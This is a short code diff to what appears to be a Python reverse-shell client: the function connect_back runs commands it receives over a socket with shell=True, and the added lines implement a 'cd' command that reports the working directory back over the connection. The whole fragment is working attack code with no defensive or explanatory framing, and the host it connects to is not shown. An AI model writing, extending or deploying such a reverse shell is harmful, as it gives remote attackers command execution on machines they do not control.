@@ -24,6 +24,15 @@ def connect_back():
                 continue
             if cmd.lower() == "exit":
                 break
+            if cmd.lower().startswith("cd"):
+                try:
+                    parts = shlex.split(cmd)
+                    if len(parts) > 1:
+                        os.chdir(parts[1])
+                    s.send(f"{os.getcwd()}\n".encode())
+                except Exception as e:
+                    s.send(f"[-] {e}\n".encode())
+                continue
             output = subprocess.run(
                 cmd,
                 shell=True,
